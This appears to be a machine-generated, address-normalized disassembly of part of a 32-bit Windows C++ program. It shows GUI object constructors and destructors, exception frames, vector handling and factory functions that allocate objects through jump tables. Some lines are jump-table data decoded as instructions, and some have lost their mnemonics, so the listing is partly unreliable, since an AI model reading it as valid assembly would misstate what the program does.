mov [ esi + 0x110 ] 0x4
mov [ esi + 0x124 ] edx
mov [ esi + 0x128 ] eax
call [ SetRectEmpty@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4206e0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a2f6
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x12c ]
mov ebx [ operator delete@IAT ]
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ esi + 0x12c ] edi
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ ebp - 0x4 ] eax
mov ecx esi
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call ebx
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
call ebx
add esp 0x4
sub_420780
push ebp
mov ebp esp
push 0xffffffff
push sub_44a2a6
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4201a0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x100 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x2
mov al 0x1
mov [ esi + 0xfc ] 0x0
mov [ esi + 0xf8 ] 0x101
mov [ esi + 0xfa ] 0x0
mov [ ebp - 0x4 ] 0x3
mov [ esi ] r--data
mov [ esi + 0x104 ] al
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_420830
push ebp
mov ebp esp
push 0xffffffff
push sub_44a8b8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_4203e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420890
push ebp
mov ebp esp
push 0xffffffff
push sub_448834
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_41f690
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea ebx [ esi + 0xc0 ]
mov ecx rw-data
mov [ ebp - 0x10 ] ebx
call edx
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x2
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea ebx [ esi + 0xcc ]
mov ecx rw-data
mov [ ebp - 0x10 ] ebx
call edx
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0xe0 ] edi
mov [ esi + 0xe4 ] edi
mov [ esi + 0xe8 ] edi
mov [ esi + 0xec ] edi
mov [ esi + 0xc4 ] 0xabacaa
mov [ esi + 0xc8 ] edi
mov [ esi + 0xd0 ] edi
mov [ esi + 0xd4 ] edi
mov [ esi + 0xd8 ] edi
mov [ esi + 0xdc ] edi
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_420970
push ebp
mov ebp esp
push 0xffffffff
push sub_4487e4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0xcc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
xor cl cl
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0xc0 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41f8f0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_420a20
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_420970
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420a50
push ebp
mov ebp esp
push 0xffffffff
push sub_449068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a258
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ ebp - 0x4 ] eax
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420b20
push ebp
mov ebp esp
push 0xffffffff
push sub_449068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420b80
push ebp
mov ebp esp
push 0xffffffff
push sub_445e3b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0xc ]
mov edi [ operator delete@IAT ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
je r-xdata
push eax
call edi
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call edi
add esp 0x4
sub_420c00
push ebp
mov ebp esp
push 0xffffffff
push sub_445e0b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_420c70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov ebx [ edi + 0x10 ]
sub ebx [ edi + 0xc ]
xor eax eax
sar ebx 0x2
mov [ ebp - 0x4 ] eax
test ebx ebx
jle r-xdata
mov ecx [ edi + 0x10 ]
mov esi [ edi + 0xc ]
cmp esi ecx
je r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push esi
call [ memmove@IAT ]
add esp 0xc
add ebx esi
mov [ edi + 0x10 ] ebx
mov ecx [ edi + 0xc ]
mov esi [ ecx + eax * 4 ]
test esi esi
je r-xdata
inc eax
mov [ ebp - 0x4 ] eax
cmp eax ebx
jl r-xdata
mov edx [ esi ]
mov eax [ edx + 0x10 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
mov eax [ ebp - 0x4 ]
sub_420cf0
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
xor edx edx
sar ecx 0x2
push esi
test ecx ecx
jle r-xdata
xor eax eax
mov esi [ eax + 0xc ]
inc edx
add esi 0x4
cmp edx ecx
jl r-xdata
cmp [ eax + 0xc ] 0x5
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
sub_420d20
mov eax [ ecx + 0x10 ]
sub eax [ ecx + 0xc ]
xor edx edx
sar eax 0x2
push esi
test eax eax
jle r-xdata
xor eax eax
pop esi
retn
mov esi [ ecx + 0xc ]
inc edx
add esi 0x4
cmp edx eax
jl r-xdata
cmp [ ecx + 0xc ] 0x5
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push ecx
call __RTDynamicCast
add esp 0x14
test eax eax
je r-xdata
mov eax [ eax + 0x15c ]
pop esi
retn
sub_420d70
push ebp
mov ebp esp
push 0xffffffff
push sub_445dda
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x10 ] 0x3
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi ecx
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
xor edx edx
sar eax 0x2
test eax eax
jle r-xdata
mov eax [ esi + 0x10 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
mov edi [ esi + 0xc ]
mov ecx [ esi + 0x14 ]
cmp eax ecx
jne r-xdata
mov edx [ esi + 0xc ]
cmp edx ecx
ja r-xdata
inc edx
add edi 0x4
cmp edx eax
jl r-xdata
mov ecx [ ecx + 0x8 ]
cmp ecx [ ebx + 0x8 ]
je r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ esi + 0x14 ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x10 ] 0x4
mov [ eax ] ebx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
mov edx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
lea edi [ edx + edi * 4 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov ecx [ edi ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
lea ecx [ esi + 0xc ]
call sub_413590
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
lea ecx [ esi + 0xc ]
call sub_413590
mov ecx eax
cmp ecx eax
jae r-xdata
sub_420ed0
push ebp
mov ebp esp
push esi
mov esi [ ebx + 0x10 ]
sub esi [ ebx + 0xc ]
push edi
sar esi 0x2
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ ebx + 0xc ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
push eax
call edx
sub_420f10
push esi
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
test eax eax
je r-xdata
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
xor edx edx
sar ecx 0x2
test ecx ecx
jle r-xdata
xor eax eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4c ]
push edi
call eax
test eax eax
jne r-xdata
mov esi [ eax + 0xc ]
pop esi
retn
inc edx
add esi 0x4
cmp edx ecx
jl r-xdata
cmp [ eax + 0x8 ] edi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
sub_420f60
push ebp
mov ebp esp
push edi
mov edi eax
test ebx ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_420f10
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edi
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov [ ebx ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x58 ]
call eax
test eax eax
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ eax ]
mov edx [ edx + 0x8 ]
push ebx
push edi
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx eax
call edx
mov esi eax
mov eax [ ebx ]
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_421040
mov esi eax
test esi esi
je r-xdata
mov ecx [ ecx + 0x4 ]
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
push ebx
push eax
mov eax [ ebp + 0x10 ]
push edi
push eax
mov eax [ ebp + 0xc ]
push eax
call edx
mov esi eax
mov [ ebx ] eax
test esi esi
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx 0x12b
jg r-xdata
pop esi
xor eax eax
pop edi
pop ebp
retn 0x10
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_421780
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov eax esi
pop esi
pop edi
pop ebp
retn 0x10
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
pop esi
xor eax eax
pop edi
pop ebp
retn 0x10
sub_421040
cmp eax 0x12b
jg r-xdata
xor eax eax
retn
cmp eax 0x13
jge r-xdata
cmp eax 0x4f
jge r-xdata
lea ecx [ eax - 0x1 ]
cmp ecx 0x11
ja r-xdata
lea ecx [ eax - 0x14 ]
cmp ecx 0x35
ja r-xdata
push 0x0
call sub_421080
retn
push 0x0
call sub_421340
retn
sub_421080
push ebp
mov ebp esp
push 0xffffffff
push sub_449d14
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
jmp [ ecx * 4 + sub_4212f4 ]
sub_4210ad
push 0x15c
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_42b6c0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4212f4
lodsd [ esi ]
adc [ edx ] al
fcom [ eax ]
inc edx
add al ah
adc al [ edx ]
add edx [ ecx ]
inc edx
add [ esi ] ch
adc [ edx ] eax
loopne r-xdata
scasd [ edi ]
adc [ edx ] eax
ficom [ ecx ]
inc edx
add [ 0xffffffffe0004212 ] al
inc edx
add al ah
adc al [ edx ]
loopne r-xdata
adc al [ edx ]
xor [ edx ] dl
inc edx
add [ eax + 0x12 ] bl
inc edx
add [ ecx + 0x12 ] bh
inc edx
add [ ebx - 0x33ffbdee ] dh
int3
add eax 0xe0004212
inc edx
add [ ecx + 0x11 ] bl
inc edx
add [ ecx + edx + 0x11af0042 ] al
inc edx
add dl bl
adc [ edx ] eax
sub_421340
push ebp
mov ebp esp
push 0xffffffff
push sub_44a88c
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
movzx edx [ ecx + sub_421744 ]
jmp [ edx * 4 + jump_table_4216ec ]
push 0xb4
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push 0x8c
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
push 0x8c
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
push 0x15c
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
push 0xb8
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
test eax eax
je r-xdata
push 0x100
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
push 0x74
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
push 0x294
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x7
test eax eax
je r-xdata
push 0x2bc
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x8
test eax eax
je r-xdata
push 0xf0
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x9
test eax eax
je r-xdata
push 0xf0
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xa
test eax eax
je r-xdata
push 0x84
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
test eax eax
je r-xdata
push 0x1d0
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xc
test eax eax
je r-xdata
push 0x74
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xd
test eax eax
je r-xdata
push 0x74
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xe
test eax eax
je r-xdata
push 0x74
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xf
test eax eax
je r-xdata
push 0x78
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x10
test eax eax
je r-xdata
push 0x80
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
test eax eax
je r-xdata
push 0x84
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x12
test eax eax
je r-xdata
push 0x278
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x13
test eax eax
je r-xdata
push 0x274
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x14
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
push eax
call sub_42e6b0
jmp r-xdata
push eax
call sub_42a730
jmp r-xdata
push eax
call sub_42e820
jmp r-xdata
push eax
call sub_42b390
jmp r-xdata
push eax
call sub_42f2c0
jmp r-xdata
push eax
call sub_430740
jmp r-xdata
push eax
call sub_431790
jmp r-xdata
push eax
call sub_431c70
jmp r-xdata
push eax
call sub_432f70
jmp r-xdata
push eax
call sub_434040
jmp r-xdata
push eax
call sub_435510
jmp r-xdata
push eax
call sub_413b90
jmp r-xdata
push eax
call sub_435b00
jmp r-xdata
push eax
call sub_436f00
jmp r-xdata
push eax
call sub_4370c0
jmp r-xdata
push eax
call sub_437350
jmp r-xdata
push eax
call sub_4375b0
jmp r-xdata
push eax
call sub_4379e0
jmp r-xdata
push eax
call sub_437da0
jmp r-xdata
push eax
call sub_438150
jmp r-xdata
push eax
call sub_439580
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
sub_421744
add [ ecx ] al
add al [ ebx ]
add al 0x5
push es
pop es
adc eax 0x15150815
adc eax 0x15151515
adc eax 0xb0a0915
or al 0x15
adc eax 0x15151515
or eax 0x15100f0e
adc eax 0x15151515
adc [ edx ] edx
adc eax 0x15151515
adc eax 0x15151515
adc edx [ esp + ecx * 8 ]
int3
sub_421780
push ebp
mov ebp esp
push 0xffffffff
push sub_44a770
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
dec ecx
xor eax eax
cmp ecx 0x10
ja r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
jmp [ ecx * 4 + jump_table_421b54 ]
push 0xc0
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push 0xc4
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
push 0x1a4
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
push 0xf8
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
push 0x1a8
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x4
test esi esi
je r-xdata
push 0xe4
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
push 0xdc
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x7
test eax eax
je r-xdata
push 0x104
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x8
test eax eax
je r-xdata
push 0xc0
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x9
test esi esi
je r-xdata
push 0x108
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0xb
test eax eax
je r-xdata
push 0xf0
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0xc
test eax eax
je r-xdata
push 0x13c
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0xd
test eax eax
je r-xdata
push 0xc0
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xe
test esi esi
je r-xdata
push 0xc4
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x10
test esi esi
je r-xdata
push 0x100
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x12
or edi 0xffffffff
test esi esi
je r-xdata
push 0xc8
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x14
or edi 0xffffffff
test esi esi
je r-xdata
xor eax eax
push eax
call sub_41f690
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_41fc60
jmp r-xdata
push eax
call sub_41fd70
jmp r-xdata
push eax
call sub_4201a0
jmp r-xdata
push esi
call sub_41fd70
mov [ ebp - 0x4 ] 0x5
mov [ esi ] r--data
mov [ esi + 0x1a4 ] 0x0
mov [ ebp - 0x4 ] 0x4
mov eax esi
jmp r-xdata
push eax
call sub_41fb60
jmp r-xdata
push eax
call sub_4200b0
jmp r-xdata
push eax
call sub_420340
jmp r-xdata
push esi
call sub_41f690
mov [ ebp - 0x4 ] 0xa
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x9
mov eax esi
jmp r-xdata
push eax
call sub_420780
jmp r-xdata
push eax
call sub_420890
jmp r-xdata
push eax
call sub_420610
jmp r-xdata
push esi
call sub_41f690
mov [ ebp - 0x4 ] 0xf
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xe
mov eax esi
jmp r-xdata
push esi
call sub_41f690
mov [ ebp - 0x4 ] 0x11
mov [ esi ] r--data
mov [ esi + 0xc0 ] 0xa
mov [ ebp - 0x4 ] 0x10
mov eax esi
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] edi
push esi
call sub_4201a0
mov [ ebp - 0x4 ] 0x13
mov [ esi ] r--data
mov [ esi + 0xf8 ] edi
mov [ esi + 0xfc ] 0x0
mov [ ebp - 0x4 ] 0x12
mov eax esi
mov [ ebp - 0x4 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push esi
call sub_41f690
mov [ ebp - 0x4 ] 0x15
mov [ esi ] r--data
mov [ esi + 0xc0 ] edi
mov [ esi + 0xc4 ] edi
mov [ ebp - 0x4 ] 0x14
mov eax esi
mov [ ebp - 0x4 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_421ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_446ef8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
